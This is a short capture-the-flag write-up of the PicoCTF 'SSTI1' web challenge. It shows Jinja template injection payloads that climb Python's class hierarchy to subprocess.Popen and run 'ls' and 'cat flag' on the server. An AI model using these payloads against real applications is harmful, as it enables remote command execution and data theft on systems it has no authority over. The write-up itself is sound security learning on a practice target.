# SSTI1
 
**Date**: 12-23-2025

**Author**: Lukas Somwong  

**Platform**: PicoCTF PicoGym

**Category**: Web

**Dificulty**: Easy

## Solution

The name of the challenge pointed towards using template injection to find the flag. 
Inputting `{{7*7}}` resulted in the expression 7*7 to evaluate as 49 as shown in the 
resulting announcement indicating jinja was being used.

![](<../images/Screenshot 2025-12-23 at 8.59.29 PM.png>)
![](<../images/Screenshot 2025-12-23 at 9.00.34 PM.png>)

I used the following expression, getting all classes in the python enviornment 
by first reaching the object class through the inheritance tree of the string class. 

`{{ ''.__class__.__mro__[1].__subclasses__() }}`

![](<../images/Screenshot 2025-12-23 at 9.02.13 PM.png>)

I discovered the location of subprocess.Popen which would allow me to execute shell commands on the server from the client. 
I used ls to list files/folders in the current directory and used communicate()[0] to get the standard output.

`{{ ''.__class__.__mro__[1].__subclasses__()[356]('ls',shell=True,stdout=-1).communicate()[0] }}`

The website output this announcment, showing a file called 'flag' in the current directory.

`b'__pycache__\napp.py\nflag\nrequirements.txt\n'`

I used cat to read the flag file which resulted in the announcement displaying the flag.

`{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate()[0] }} `

![](<../images/Screenshot 2025-12-23 at 9.03.35 PM.png>)